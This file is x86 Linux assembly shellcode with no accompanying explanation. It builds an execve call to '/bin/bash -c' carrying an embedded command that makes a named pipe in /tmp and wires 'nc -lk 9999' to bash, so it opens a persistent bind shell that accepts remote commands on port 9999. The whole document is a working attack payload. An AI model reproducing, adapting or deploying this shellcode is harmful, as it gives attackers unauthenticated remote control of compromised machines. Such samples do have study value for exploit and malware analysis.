global _start			

section .text
_start:

xor eax,eax
xor edx,edx
mov al,0xb		;int execve(const char *filename, char *const argv[], 
                        ;               char *const envp[]);

push   edx		;null
push   word 0x632d 	;-c 
mov edi,esp		;save in edi the -c value

push edx		;null
push 0x68736162		;////bin/bash
push 0x2f6e6962
push 0x2f2f2f2f

mov ebx,esp		;set first arg in ebx *filename	
push   edx		;null

jmp short push_cmd		;jump to collect the command

set_argv:
 push edi		;push -c value
 push ebx		;push ////bin/bash
 mov ecx,esp		;*argv: ////bin/bash, -c, cmd, null
 int    0x80

push_cmd:
 call set_argv
 cmd: db " rm -f /tmp/f; mkfifo /tmp/f; /bin/nc -lk 9999 0</tmp/f | /bin/bash &>/tmp/f"
